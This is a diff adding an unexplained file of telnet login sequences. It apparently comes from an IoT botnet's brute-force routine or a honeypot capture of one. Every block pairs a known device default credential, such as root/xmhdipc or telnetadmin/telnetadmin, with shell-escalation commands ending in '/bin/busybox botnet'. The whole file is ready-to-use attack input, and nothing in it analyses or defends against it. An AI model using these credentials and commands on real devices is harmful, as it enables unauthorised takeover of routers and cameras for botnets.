@@ -1,0 +1,80 @@
+root
+
+grouter
+enable
+system
+shell
+sh
+/bin/busybox botnet
+user
+
+1234
+enable
+system
+shell
+sh
+/bin/busybox botnet
+telnetadmin
+
+telnetadmin
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+root123
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+xmhdipc
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+aa123456789
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+ascend
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+twe8ehome
+enable
+system
+shell
+sh
+/bin/busybox botnet
+telnetadmin
+
+telnetadmin
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+520123
+enable
+system
+shell
+sh
+/bin/busybox botnet
